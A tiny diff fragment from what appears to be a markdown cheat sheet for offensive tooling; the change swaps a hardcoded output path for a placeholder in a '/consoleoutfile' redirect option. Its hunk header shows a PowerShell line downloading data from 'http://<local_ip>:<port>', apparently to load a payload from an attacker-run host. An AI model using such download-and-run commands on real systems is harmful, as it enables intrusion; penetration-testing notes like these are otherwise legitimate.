@@ -24,7 +24,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|
 
 ## redirect output
 ```
-/consoleoutfile:c:\temp\file.txt
+/consoleoutfile:<file_path>
 ```
 
 
